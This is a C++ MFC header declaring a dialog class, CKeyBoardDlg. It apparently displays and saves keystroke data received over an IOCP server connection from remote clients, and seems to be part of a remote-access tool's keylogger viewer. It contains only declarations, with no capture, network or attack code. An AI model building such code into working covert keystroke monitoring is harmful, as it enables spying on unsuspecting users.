#if !defined(AFX_KEYBOARDDLG_H__DA43EE1D_DB0E_4531_86C6_8EF7B5B9DA88__INCLUDED_)
#define AFX_KEYBOARDDLG_H__DA43EE1D_DB0E_4531_86C6_8EF7B5B9DA88__INCLUDED_

#include "Resource.h"
#include "IOCPServer.h"

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// KeyBoardDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg dialog

class CKeyBoardDlg : public DialogBase
{
// Construction
public:
    void OnReceiveComplete();
    CKeyBoardDlg(CWnd* pParent = NULL, Server* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor

// Dialog Data
    //{{AFX_DATA(CKeyBoardDlg)
    enum { IDD = IDD_DLG_KEYBOARD };
    CEdit	m_edit;
    //}}AFX_DATA

// Overrides
    // ClassWizard generated virtual function overrides
    //{{AFX_VIRTUAL(CKeyBoardDlg)
public:
    virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
    virtual void PostNcDestroy();
    //}}AFX_VIRTUAL

// Implementation
protected:
    bool m_bIsOfflineRecord;

    void AddKeyBoardData();
    void UpdateTitle();
    void ResizeEdit();
    bool SaveRecord();

    // Generated message map functions
    //{{AFX_MSG(CKeyBoardDlg)
    virtual BOOL OnInitDialog();
    afx_msg void OnSize(UINT nType, int cx, int cy);
    afx_msg void OnClose();
    afx_msg void OnSysCommand(UINT nID, LPARAM lParam);

    //}}AFX_MSG
    DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_KEYBOARDDLG_H__DA43EE1D_DB0E_4531_86C6_8EF7B5B9DA88__INCLUDED_)
